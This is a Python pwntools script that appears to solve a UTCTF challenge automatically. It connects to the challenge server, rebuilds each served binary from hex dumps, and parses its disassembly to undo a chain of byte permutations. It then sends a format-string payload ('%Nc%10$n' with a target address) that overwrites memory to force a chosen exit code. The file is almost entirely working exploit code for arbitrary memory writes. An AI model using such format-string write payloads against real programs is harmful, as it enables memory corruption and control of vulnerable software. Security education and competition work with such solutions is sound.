from pwn import *
# from LibcTool import *
import os
context(os='linux',arch='amd64',log_level='debug')
# elf=ELF('./')
sh=remote('pwn.utctf.live',5002)
# sh=process('./')
# attach(sh)
# raw_input()
 
def en_code(s,order):
    global arg3
    global arg4
    global arg6
    global arg7
    global arg8
    if len(s)<512:
        s=s.ljust(512,'\0')
    for i in order:
        if i==1:
            s=s[::-1]
        elif i==2:
            s=s[256:]+s[:256]
        elif i==3:
            s=s[arg3:]+s[:arg3]
        elif i==4:
            s=s[arg4:]+s[:arg4]
        elif i==5:
            s1=s[1::-1]
            for j in range(2,512,2):
                s1+=s[j+1:j-1:-1]
            s=s1
        elif i==7:
            s1=''
            for j in range(0,512,arg7):
                s1+=s[j+1:j+arg7]
                s1+=s[j]
            s=s1
        elif i==6:
            s1=''
            for j in range(0,512,arg6):
                s1+=s[j+arg6-1]
            s=s1
    return s
 
sh.sendlineafter('binary.','')
while True:
    exit_code=0
    with open('xxd0','w') as file:
        while True:
            l=sh.recvline()
            if l[:4]=='0000':
                file.write(l)
            elif l[:6]=='Binary':
                exit_code=int(l[len('Binary should exit with code '):])
                log.success('exit_code='+str(exit_code))
                break
 
    os.system('xxd -r xxd0 >elf0')
    elf=ELF('./elf0')
    psh=os.popen('objdump -d ./elf0 | '
                 'grep -E -A 29 "[0-9a-f]{16} <permute>"')
    for i in range(6):
        psh.readline()
    order=[]
    for i in range(8):
        for j in range(2):
            psh.readline()
        l=int(psh.readline()[-3:-2])
        order.append(l)
    log.success('order: '+str(order))
 
    l=elf.disasm(elf.symbols['permute3'],0x100)
    l=l[l.find('mov    DWORD PTR [rbp-0x218],')+
        len('mov    DWORD PTR [rbp-0x218], '):]
    l=l[:l.find('\n')]
    arg3=int(l,16)
    log.info('arg3='+str(arg3))
 
    l=elf.disasm(elf.symbols['permute4'],0x100)
    l=l[l.find('mov    DWORD PTR [rbp-0x218],')+
        len('mov    DWORD PTR [rbp-0x218], '):]
    l=l[:l.find('\n')]
    arg4=int(l,16)
    log.info('arg4='+str(arg4))
 
    l=elf.disasm(elf.symbols['permute6'],0x100)
    pos=l.find('add    DWORD PTR [rbp-0x21c],')
    if pos<0:
        pos=l.find('sub    DWORD PTR [rbp-0x21c],')
        sub=True
    else:
        sub=False
    l=l[pos+len('add    DWORD PTR [rbp-0x21c], '):]
    l=l[:l.find('\n')]
    arg6=int(l,16)
    if sub:
        arg6=0x100000000-arg6
    log.info('arg6='+str(arg6))
 
    l=elf.disasm(elf.symbols['permute7'],0x100)
    pos=l.find('add    DWORD PTR [rbp-0x21c],')
    if pos<0:
        pos=l.find('sub    DWORD PTR [rbp-0x21c],')
        sub=True
    else:
        sub=False
    l=l[pos+len('add    DWORD PTR [rbp-0x21c], '):]
    l=l[:l.find('\n')]
    arg7=int(l,16)
    if sub:
        arg7=0x100000000-arg7
    log.info('arg7='+str(arg7))
 
    l=elf.disasm(elf.symbols['permute8'],0x100)
    pos=l.find('add    DWORD PTR [rbp-0x21c],')
    if pos<0:
        pos=l.find('sub    DWORD PTR [rbp-0x21c],')
        sub=True
    else:
        sub=False
    l=l[pos+len('add    DWORD PTR [rbp-0x21c], '):]
    l=l[:l.find('\n')]
    arg8=int(l,16)
    if sub:
        arg8=0x100000000-arg8
    log.info('arg8='+str(arg8))
 
    sh.sendlineafter('input:', en_code(flat(('%'+str(exit_code)+'c%10$n').ljust(16,'\0'), 0x40405c), reversed(order)))
 
sh.interactive()
sh.close()
